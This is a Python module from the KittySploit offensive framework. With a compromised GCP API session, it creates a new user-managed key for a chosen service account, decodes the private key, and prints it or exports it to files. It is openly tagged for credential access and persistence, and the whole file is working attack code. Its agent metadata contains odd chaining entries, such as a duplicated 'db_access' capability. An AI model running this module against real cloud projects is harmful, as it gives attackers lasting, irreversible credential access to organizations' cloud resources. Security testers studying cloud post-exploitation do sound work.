#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import base64
import json

from kittysploit import *
from lib.post.gcp import GcpPostMixin


class Module(Post, GcpPostMixin):
    __info__ = {
        "name": "GCP Create Service Account Key",
        "description": "Create a user-managed JSON key for a service account",
        "author": "KittySploit Team",
        "session_type": SessionType.GCP_API,
        "tags": ["gcp", "cloud", "iam", "credentials", "persistence"],
    'agent': {
        'risk': 'intrusive',
        'effects': ['credential_access', 'configuration_change', 'api_request'],
        'expected_requests': 1,
        'reversible': False,
        'approval_required': True,
        'produces': ['credentials', 'risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    service_account_email = OptString("", "Target service account email", True)
    key_algorithm = OptString("KEY_ALG_RSA_2048", "Key algorithm (KEY_ALG_RSA_2048)", False)
    export_key_file = OptString("", "Write decoded service account JSON key to this file", False)
    export_json = OptString("", "Optional metadata output JSON file", False)
    mask_key = OptBool(True, "Mask private key material in console output", False)

    def run(self):
        try:
            project_id = self._gcp_project_id()
            target = str(self.service_account_email or "").strip()
            if not project_id:
                print_error("Could not resolve project_id from session")
                return False
            if not target:
                print_error("service_account_email is required")
                return False

            print_info(f"Creating user-managed key for {target}...")
            result = self._gcp_create_service_account_key(
                project_id,
                target,
                key_algorithm=str(self.key_algorithm or "KEY_ALG_RSA_2048"),
            )
            if not result.get("ok"):
                print_error(f"Key creation failed: {result.get('error', '')}")
                return False

            key = result.get("key") or {}
            private_key_data = str(key.get("privateKeyData") or "")
            key_name = key.get("name", "")
            print_success("Service account key created")
            print_info(f"Key resource: {key_name}")
            print_info(f"Valid after: {key.get('validAfterTime', '?')}")

            decoded_key = None
            if private_key_data:
                try:
                    decoded_key = base64.b64decode(private_key_data).decode("utf-8", errors="replace")
                except Exception:
                    decoded_key = private_key_data

            if decoded_key and self.export_key_file:
                key_path = self._gcp_export_text(str(self.export_key_file), decoded_key)
                if key_path:
                    print_success(f"Service account key written to {key_path}")
            elif decoded_key:
                displayed = self._gcp_mask_value(decoded_key, mask=bool(self.mask_key))
                print_info(f"Private key material: {displayed[:500]}")

            output = {
                "project_id": project_id,
                "service_account_email": target,
                "key_name": key_name,
                "validAfterTime": key.get("validAfterTime"),
                "validBeforeTime": key.get("validBeforeTime"),
                "privateKeyData": decoded_key,
            }
            exported = self._gcp_export_json(str(self.export_json or ""), output)
            if exported:
                print_success(f"Results exported to {exported}")

            return self.module_result(success=True, data=output)
        except Exception as exc:
            print_error(f"Service account key creation failed: {exc}")
            return False
